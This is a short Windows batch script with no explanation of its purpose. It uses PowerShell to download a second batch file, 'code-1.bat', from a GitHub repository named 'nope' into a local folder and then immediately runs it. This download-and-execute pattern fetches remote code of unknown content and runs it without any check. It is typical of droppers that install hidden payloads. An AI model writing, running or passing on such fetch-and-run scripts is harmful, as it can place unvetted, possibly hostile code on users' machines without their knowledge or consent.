@echo off 
cls


powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/code-1.bat','C:\your\asylum\code-1.bat')"

start code-1.bat

pause
exit
